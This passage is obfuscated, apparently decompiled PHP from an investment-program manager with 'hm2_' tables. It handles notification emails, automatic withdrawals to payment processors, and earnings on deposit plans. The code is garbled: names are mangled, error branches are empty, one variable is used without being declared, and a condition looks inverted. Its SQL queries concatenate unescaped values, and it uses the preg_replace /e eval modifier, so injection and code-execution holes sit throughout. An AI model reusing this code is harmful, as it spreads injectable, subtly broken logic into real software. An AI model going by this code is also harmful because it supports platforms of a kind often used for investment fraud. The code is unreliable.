        $elnlcwhSO = preg_replace( "/#site_url#/", $elnlccQgz[$elnlcNjKgR['elnlcJMvc']], $elnlcwhSO );
        if ( $elnlcELue[$elnlcNjKgR['elnlcfdRg']] )
        {
            $elnlcTjMG = elnlczndbm( 12 );
            $elnlcKthzE = elnlcmetbc( $elnlcKthzE );
            $elnlcugwEL = elnlcifss( $elnlcugwEL );
            $elnlcJcbh = "--{$elnlcTjMG}\nContent-Type: text/plain;\nContent-Transfer-Encoding: 8bit\n\n{$elnlcKthzE}\n\n--{$elnlcTjMG}\nContent-Type: text/html;\nContent-transfer-encoding: quoted-printable;\n\n{$elnlcugwEL}\n\n--{$elnlcTjMG}--";
        }
        else
        {
            $elnlcJcbh = $elnlcKthzE;
        }
        if ( $elnlccQgz[$elnlcNjKgR['elnlcTUnQ']] == $elnlcNjKgR['elnlcunJPe'] )
        {
            $elnlcixBSK = fopen( $elnlcNjKgR['elnlcyMpBj'], $elnlcNjKgR['elnlcUtgP'] );
            fwrite( $elnlcixBSK, "TO: {$elnlcLvMv}\nFrom: {$elnlcGmGw}\nSubject: {$elnlcwhSO}\n\n{$elnlcKthzE}\n\n" );
            fclose( $elnlcixBSK );
        }
        else
        {
            mail( $elnlcLvMv, $elnlcwhSO, $elnlcJcbh, "From: {$elnlcGmGw}\nReply-To: {$elnlcGmGw}".( $elnlcELue[$elnlcNjKgR['elnlcfdRg']] ? "\nContent-Type: multipart/alternative; boundary={$elnlcTjMG}" : "" ) );
        }
    }
}

function elnlcfnral( $elnlcfqTvm )
{
    global $elnlcNjKgR;
    $elnlcfqTvm = str_replace( "\r\n", "\n", $elnlcfqTvm );
    $elnlcfqTvm = str_replace( "\r", "\n", $elnlcfqTvm );
    return $elnlcfqTvm;
}

function elnlcmetbc( $elnlcfqTvm )
{
    global $elnlcNjKgR;
    $elnlclwqk = elnlcfnral( $elnlcfqTvm );
    if ( substr( $elnlclwqk, 0 - strlen( "\n" ) ) != "\n" )
    {
        $elnlclwqk .= "\n";
    }
    return $elnlclwqk;
}

function elnlcifss( $elnlcfqTvm )
{
    global $elnlcNjKgR;
    $elnlclwqk = elnlcfnral( $elnlcfqTvm );
    if ( substr( $elnlclwqk, 0 - strlen( "\n" ) ) != "\n" )
    {
        $elnlclwqk .= "\n";
    }
    $elnlclwqk = preg_replace( "/([\\000-\\010\\013\\014\\016-\\037\\075\\177-\\377])/e", "'='.sprintf('%02X', ord('\\1'))", $elnlclwqk );
    $elnlclwqk = preg_replace( "/([\t ])\n/e", "'='.sprintf('%02X', ord('\\1')).'\n'", $elnlclwqk );
    $elnlclwqk = elnlcplbe( $elnlclwqk, 74, true );
    return $elnlclwqk;
}

function elnlcplbe( $elnlccMBGM, $elnlctzblQ, $elnlccawca = false )
{
    global $elnlcNjKgR;
    $elnlcyjkTc = $elnlccawca ? sprintf( " =%s", "\n" ) : "\n";
    $elnlccMBGM = elnlcfnral( $elnlccMBGM );
    if ( substr( $elnlccMBGM, -1 ) == "\n" )
    {
        $elnlccMBGM = substr( $elnlccMBGM, 0, -1 );
    }
    $elnlcoEkN = explode( "\n", $elnlccMBGM );
    $elnlccMBGM = "";
    $i = 0;
    for ( ; $i < count( $elnlcoEkN ); ++$i )
    {
        $elnlcnDeqG = explode( " ", $elnlcoEkN[$i] );
        $elnlcDHagB = "";
        $e = $elnlcNjKgR['elnlcuSFVu'];
        for ( ; $e < count( $elnlcnDeqG ); ++$e )
        {
            $elnlcyHdnO = $elnlcnDeqG[$e];
            if ( $elnlccawca && $elnlctzblQ < strlen( $elnlcyHdnO ) )
            {
                $elnlcPgpw = $elnlctzblQ - strlen( $elnlcDHagB ) - 1;
                if ( $e != 0 )
                {
                    if ( 20 < $elnlcPgpw )
                    {
                        $elnlccxIrb = $elnlcPgpw;
                        if ( substr( $elnlcyHdnO, $elnlccxIrb - 1, 1 ) == "=" )
                        {
                            --$elnlccxIrb;
                        }
                        else if ( substr( $elnlcyHdnO, $elnlccxIrb - 2, 1 ) == "=" )
                        {
                            $elnlccxIrb -= 2;
                        }
                        $elnlcjFMJH = substr( $elnlcyHdnO, 0, $elnlccxIrb );
                        $elnlcyHdnO = substr( $elnlcyHdnO, $elnlccxIrb );
                        $elnlcDHagB .= " ".$elnlcjFMJH;
                        $elnlccMBGM .= $elnlcDHagB.sprintf( "=%s", "\n" );
                    }
                    else
                    {
                        $elnlccMBGM .= $elnlcDHagB.$elnlcyjkTc;
                    }
                    $elnlcDHagB = "";
                }
                if ( 0 < strlen( $elnlcyHdnO ) )
                {
                    $elnlccxIrb = $elnlctzblQ;
                    if ( substr( $elnlcyHdnO, $elnlccxIrb - 1, 1 ) == "=" )
                    {
                        --$elnlccxIrb;
                    }
                    else if ( substr( $elnlcyHdnO, $elnlccxIrb - 2, 1 ) == "=" )
                    {
                        $elnlccxIrb -= 2;
                    }
                    $elnlcjFMJH = substr( $elnlcyHdnO, 0, $elnlccxIrb );
                    $elnlcyHdnO = substr( $elnlcyHdnO, $elnlccxIrb );
                    if ( 0 < strlen( $elnlcyHdnO ) )
                    {
                        $elnlccMBGM .= $elnlcjFMJH.sprintf( "=%s", "\n" );
                    }
                    else
                    {
                        $elnlcDHagB = $elnlcjFMJH;
                        continue;
                    }
                }
            }
            else
            {
                $elnlcmgQuq = $elnlcDHagB;
                $elnlcDHagB .= $e == 0 ? $elnlcyHdnO : " ".$elnlcyHdnO;
                if ( $elnlctzblQ < strlen( $elnlcDHagB ) && $elnlcmgQuq != "" )
                {
                    $elnlccMBGM .= $elnlcmgQuq.$elnlcyjkTc;
                    $elnlcDHagB = $elnlcyHdnO;
                }
            }
        }
        $elnlccMBGM .= $elnlcDHagB."\n";
    }
    return $elnlccMBGM;
}

function elnlcszdle( $elnlcWEoV = "100%" )
{
    return "\r\n<table cellspacing=0 cellpadding=1 border=0 width={$elnlcWEoV} bgcolor=#FF8D00>\r\n<tr><td bgcolor=#FF8D00>\r\n<table cellspacing=0 cellpadding=0 border=0 width=100%>\r\n<tr>\r\n<td valign=top width=10 bgcolor=#FFFFF2><img src=images/sign.gif></td>\r\n<td valign=top bgcolor=#FFFFF2 style='padding: 10px; color: #D20202; font-family: verdana; font-size: 11px;'>\r\n";
}

function elnlcyybkt( )
{
    return "</td></tr></table></td></tr></table>";
}

function elnlcdohum( $elnlcgNAw, $elnlcUnxH, $elnlclqWaS )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    if ( $elnlccQgz[$elnlcNjKgR['elnlcTOOda']] == 1 )
    {
    }
    else
    {
        if ( $elnlccQgz[$elnlcNjKgR['elnlcLIUfq']] == 1 )
        {
            $q = "select * from hm2_deposits where id = {$elnlcgNAw}";
            if ( !( $elnlccfAC = mysql_query( $q ) ) )
            {
            }
            $elnlcDzBVe = mysql_fetch_array( $elnlccfAC );
            if ( !$elnlcbVrbx[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]][$elnlcNjKgR['elnlcqMWfN']] )
            {
            }
            else
            {
                $q = "select * from hm2_users where id = ".$elnlcDzBVe[$elnlcNjKgR['elnlclLVw']];
                if ( !( $elnlccfAC = mysql_query( $q ) ) )
                {
                }
                $elnlcdASzW = mysql_fetch_array( $elnlccfAC );
                if ( $elnlcdASzW[$elnlcNjKgR['elnlcxRQO']] != 1 || $elnlcdASzW[$elnlcNjKgR['elnlcQUFx']] != 1 )
                {
                }
                else
                {
                    if ( 0 < $elnlccQgz[$elnlcNjKgR['elnlcdUmk']] )
                    {
                        $q = "select sum(actual_amount*(type = 'add_funds')) as td, sum(actual_amount*(type = 'withdrawal')) as tw from hm2_history where type in ('add_funds', 'withdrawal')";
                        if ( !( $elnlccfAC = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcELue = mysql_fetch_array( $elnlccfAC );
                        if ( 0 < $elnlcELue[$elnlcNjKgR['elnlcWgEUx']] && $elnlccQgz[$elnlcNjKgR['elnlcdUmk']] <= ( $elnlcELue[$elnlcNjKgR['elnlcvSne']] + $elnlcUnxH ) * 100 / $elnlcELue[$elnlcNjKgR['elnlcWgEUx']] )
                        {
                            return;
                        }
                    }
                    $elnlcJUap = unserialize( $elnlcdASzW[$elnlcNjKgR['elnlcUCpez']] );
                    $elnlcUnxH = abs( $elnlcUnxH );
                    $elnlchDVqy = floor( $elnlcUnxH * $elnlccQgz[$elnlcNjKgR['elnlccFGGJ']] ) / 100;
                    if ( $elnlchDVqy < $elnlccQgz[$elnlcNjKgR['elnlcgnqI']] )
                    {
                        $elnlchDVqy = $elnlccQgz[$elnlcNjKgR['elnlcgnqI']];
                    }
                    $elnlcvkpL = $elnlcUnxH - $elnlchDVqy;
                    if ( $elnlcvkpL < 0 )
                    {
                        $elnlcvkpL = $elnlcNjKgR['elnlcuSFVu'];
                    }
                    $elnlcvkpL = sprintf( "%.02f", floor( $elnlcvkpL * 100 ) / 100 );
                    if ( $elnlccQgz[$elnlcNjKgR['elnlcorSP']] != "" )
                    {
                        $elnlcfcjQM = "Earning from deposit \$".$elnlcDzBVe[$elnlcNjKgR['elnlcHMum']].". Auto withdraw to ".$elnlcdASzW[$elnlcNjKgR['elnlcikTzy']]." from ".$elnlccQgz[$elnlcNjKgR['elnlcTUnQ']];
                    }
                    else
                    {
                        $elnlcfcjQM = $elnlccQgz[$elnlcNjKgR['elnlcorSP']];
                    }
                    $elnlcszUr = "Auto-withdrawal error, tried to send {$elnlcvkpL} earning to ".$elnlcbVrbx[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]][$elnlcNjKgR['elnlcnOIx']]." account # ".$elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]].". Error:";
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 0 )
                    {
                        $elnlcIhgiM = elnlcbpglv( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcbpglv( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcbpglv( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 1 )
                    {
                        $elnlcIhgiM = elnlcfley( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcfley( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcfley( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 2 )
                    {
                        $elnlcIhgiM = elnlcmcfd( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcmcfd( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcmcfd( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 5 )
                    {
                        $elnlcIhgiM = elnlczjyug( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlczjyug( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlczjyug( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 8 )
                    {
                        $elnlcIhgiM = elnlcjkwq( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcjkwq( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcjkwq( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 9 )
                    {
                        $elnlcIhgiM = elnlcnjkb( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcnjkb( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcnjkb( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 15 )
                    {
                        $elnlcIhgiM = elnlcblhcn( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcblhcn( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcblhcn( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 16 )
                    {
                        $elnlcIhgiM = elnlccjns( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlccjns( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlccjns( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 17 )
                    {
                        $elnlcIhgiM = elnlclwqr( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlclwqr( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlclwqr( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 18 )
                    {
                        $elnlcIhgiM = elnlcuran( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcuran( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcuran( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcDzBVe[$elnlcNjKgR['elnlccwLV']] == 24 )
                    {
                        $elnlcIhgiM = elnlcfhso( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[2];
                        $elnlcKthzE = elnlcfhso( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[1];
                        $elnlcPCLVx = elnlcfhso( "", $elnlcvkpL, $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]], $elnlcfcjQM, $elnlcszUr )[0];
                    }
                    if ( $elnlcPCLVx == 1 )
                    {
                        $q = "insert into hm2_history set\r\n            user_id = ".$elnlcdASzW[$elnlcNjKgR['elnlcohjn']].",\r\n        \t\tamount = -{$elnlcUnxH},\r\n            \t\tactual_amount = -{$elnlcUnxH},\r\n        \t\ttype='withdrawal',\r\n            \t\t{$elnlclqWaS},\r\n\t\t\tec = ".$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']].",\r\n        \t\tdescription = 'Auto-withdrawal earning to account ".$elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]].". Batch is {$elnlcIhgiM}'";
                        if ( !mysql_query( $q ) )
                        {
                        }
                        $elnlcvQzG = array( );
                        $elnlcvQzG[$elnlcNjKgR['elnlcikTzy']] = $elnlcdASzW[$elnlcNjKgR['elnlcikTzy']];
                        $elnlcvQzG[$elnlcNjKgR['elnlcnOIx']] = $elnlcdASzW[$elnlcNjKgR['elnlcnOIx']];
                        $elnlcvQzG[$elnlcNjKgR['elnlcoaCmS']] = $elnlcUnxH;
                        $elnlcvQzG[$elnlcNjKgR['elnlcgIiR']] = $elnlcIhgiM;
                        $elnlcvQzG[$elnlcNjKgR['elnlcEmeQP']] = $elnlcJUap[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]];
                        $elnlcvQzG[$elnlcNjKgR['elnlcComr']] = $elnlcbVrbx[$elnlcDzBVe[$elnlcNjKgR['elnlccwLV']]][$elnlcNjKgR['elnlcnOIx']];
                        elnlchnob( "withdraw_user_notification", $elnlcdASzW[$elnlcNjKgR['elnlcvKtVx']], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcvQzG );
                        elnlchnob( "withdraw_admin_notification", $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlccQgz[$elnlcNjKgR['elnlctDgi']], $elnlcvQzG );
                    }
                }
            }
        }
    }
}

function elnlcyslh( $elnlcCNAi )
{
    global $elnlcNjKgR;
    global $elnlccQgz;
    $elnlcCJNDN = array( );
    if ( $elnlccQgz[$elnlcNjKgR['elnlcozpI']] == 1 && $elnlcCNAi != -2 )
    {
    }
    else
    {
        $q = "select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = 'on' and hm2_types.id = hm2_plans.parent order by parent, min_deposit";
        if ( !( $elnlccfAC = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
        {
            $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcPpDvW']]][$elnlcELue[$elnlcNjKgR['elnlcohjn']]] = $elnlcELue;
        }
        $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
        $elnlcODMO = "u.last_access_time + interval 30 minute < now() ";
        if ( $elnlcCNAi == -1 )
        {
            $elnlcODMO = "1 = 1";
            $q = "select * from hm2_users where l_e_t + interval 15 minute < now() and status = 'on'";
        }
        else
        {
            $q = "select * from hm2_users where id = {$elnlcCNAi} and status = 'on'";
        }
        if ( $elnlcCNAi == -2 )
        {
            $q = "select * from hm2_users where status = 'on'";
            $q = "select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id";
        }
        if ( !( $elnlcwWcoU = mysql_query( $q ) ) )
        {
        }
        while ( $elnlcGTJx = mysql_fetch_array( $elnlcwWcoU ) )
        {
            $elnlcRMjNn = $elnlcGTJx[$elnlcNjKgR['elnlcohjn']];
            $q = "update hm2_users set l_e_t = now() where id = {$elnlcRMjNn}";
            if ( !mysql_query( $q ) )
            {
            }
            $elnlcOrJNk = $elnlcNjKgR['elnlcqGMK'];
            $elnlcbyvxA = " ((t.work_week = 1)*(floor(q_days / 5) * 7 + q_days % 5 + ((q_days % 5 + WEEKDAY(deposit_date)) > 5)*2 - 1) + (t.work_week = 0)*(t.q_days)) ";
            while ( 0 < $elnlcOrJNk )
            {
                $q = "select \r\n              d.*, \r\n              t.period as period, t.use_compound as use_compound,\r\n              t.compound_min_deposit, t.compound_max_deposit,\r\n              t.compound_min_percent, t.compound_max_percent,\r\n              t.compound_percents_type, t.compound_percents,\r\n              t.work_week as work_week,\r\n              t.q_days as q_days, t.withdraw_principal,\r\n              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,\r\n              t.return_profit as return_profit,\r\n              {$elnlcbyvxA} as q_days1\r\n            from\r\n              hm2_deposits as d,\r\n              hm2_types as t,\r\n              hm2_users as u\r\n            where \r\n              u.id = {$elnlcRMjNn} and \r\n              u.status = 'on' and \r\n              d.status='on' and \r\n              d.type_id = t.id and \r\n              t.status = 'on' and \r\n              u.id = d.user_id and\r\n              ((({$elnlcbyvxA} + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / if(t.period = 'h', 60*60, 60*60*24))) or {$elnlcbyvxA} = 0) and \r\n              (\r\n                (d.last_pay_date + interval 1 hour <= now() and t.period = 'h')or\r\n                (d.last_pay_date + interval 1 day <= now() and t.period = 'd')or\r\n                (d.last_pay_date + interval 7 day <= now() and t.period = 'w') or\r\n                (d.last_pay_date + interval 14 day <= now() and t.period = 'b-w') or\r\n                (d.last_pay_date + interval 1 month <= now() and t.period = 'm') or\r\n                (d.last_pay_date + interval 2 month <= now() and t.period = '2m') or\r\n                (d.last_pay_date + interval 3 month <= now() and t.period = '3m') or\r\n                (d.last_pay_date + interval 6 month <= now() and t.period = '6m') or\r\n                (d.last_pay_date + interval 1 year <= now() and t.period = 'y') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day <= now() and t.period = 'end') \r\n              ) and\r\n              (({$elnlcbyvxA} = 0) or \r\n                (               \r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) hour >= d.last_pay_date and t.period = 'h') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date and t.period = 'd') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = 'w') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = 'b-w') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = 'm') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = '2m') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = '3m') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = '6m') or\r\n                (d.deposit_date + interval {$elnlcbyvxA} + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = 'y') or\r\n                ({$elnlcbyvxA} > 0 and t.period = 'end') \r\n              ))";
                if ( !( $elnlccfAC = mysql_query( $q ) ) )
                {
                }
                $elnlcOrJNk = $elnlcNjKgR['elnlcuSFVu'];
                do
                {
                    if ( $elnlcELue = mysql_fetch_array( $elnlccfAC ) )
                    {
                        ++$elnlcOrJNk;
                        if ( !isset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            continue;
                        }
                        $elnlcMPfma = $elnlcNjKgR['elnlcuSFVu'];
                        $elnlcfNqo = $elnlcNjKgR['elnlcuSFVu'];
                        reset( $elnlcCJNDN );
                        reset( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] );
                        $elnlcDrFtL = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[1];
                        $elnlcwody = each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] )[0];
                        while ( each( $elnlcCJNDN[$elnlcELue[$elnlcNjKgR['elnlcAKAt']]] ) )
                        {
                            if ( $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] <= $elnlcELue[$elnlcNjKgR['elnlcHMum']] && ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] <= $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] || $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] == 0 ) )
                            {
                                $elnlcMPfma = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && $elnlcMPfma == 0 )
                            {
                                $elnlcMPfma = $elnlcfNqo;
                            }
                            if ( $elnlcELue[$elnlcNjKgR['elnlcHMum']] < $elnlcDrFtL[$elnlcNjKgR['elnlcjlBJ']] && 0 < $elnlcMPfma )
                            {
                                break;
                            }
                            $elnlcfNqo = $elnlcDrFtL[$elnlcNjKgR['elnlcLDncy']];
                        }
                        if ( $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] != 0 && $elnlcDrFtL[$elnlcNjKgR['elnlclBAo']] < $elnlcELue[$elnlcNjKgR['elnlcHMum']] )
                        {
                            $elnlcMPfma = $elnlcfNqo;
                        }
                        $elnlcVrlk = $elnlcELue[$elnlcNjKgR['elnlcHMum']] * $elnlcMPfma / 100;
                        $elnlcItiUC = "";
                        if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcIRKW'] )
                        {
                            $elnlcItiUC = " 1 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] )
                        {
                            $elnlcItiUC = " 1 hour ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcaMSd'] )
                        {
                            $elnlcItiUC = " 7 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == "b-w" )
                        {
                            $elnlcItiUC = " 14 day ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcUSFe'] )
                        {
                            $elnlcItiUC = " 1 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcJJEVd'] )
                        {
                            $elnlcItiUC = " 2 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrQnF'] )
                        {
                            $elnlcItiUC = " 3 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcrUjC'] )
                        {
                            $elnlcItiUC = " 6 month ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcdSav'] )
                        {
                            $elnlcItiUC = " 1 year ";
                        }
                        else if ( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlctCKl'] )
                        {
                            $elnlcItiUC = " ".$elnlcELue[$elnlcNjKgR['elnlciimMw']]." day ";
                        }
                        if ( $elnlcMPfma == 0 && $elnlcItiUC == "" )
                        {
                            continue;
                        }
                        $elnlcIvDc = -1;
                        $q = "select weekday('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) as dw";
                        if ( !( $elnlcdtez = mysql_query( $q ) ) )
                        {
                        }
                        while ( $elnlciJDQr = mysql_fetch_array( $elnlcdtez ) )
                        {
                            $elnlcIvDc = $elnlciJDQr[$elnlcNjKgR['elnlcSzOy']];
                        }
                        $q = "select count(id) as col from hm2_history where ".( $elnlcELue[$elnlcNjKgR['elnlcpWHS']] == $elnlcNjKgR['elnlcWNmo'] ? " date_format(date, '%Y-%m-%d %H') = date_format('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}, '%Y-%m-%d %H') and" : "to_days(date) = to_days('".$elnlcELue[$elnlcNjKgR['elnlcGpdqu']]."' + interval {$elnlcItiUC}) and " )." deposit_id = ".$elnlcELue[$elnlcNjKgR['elnlcohjn']];
                        if ( !( $elnlcVoHIM = mysql_query( $q ) ) )
                        {
                        }
                        $elnlcjlas = $elnlcNjKgR['elnlcuSFVu'];
                        while ( $elnlcTyBK = mysql_fetch_array( $elnlcVoHIM ) )
                        {
                            $elnlcjlas = $elnlcTyBK[$elnlcNjKgR['elnlcmzAk']];
                        }
                        if ( $elnlcjlas == 0 )
                        {
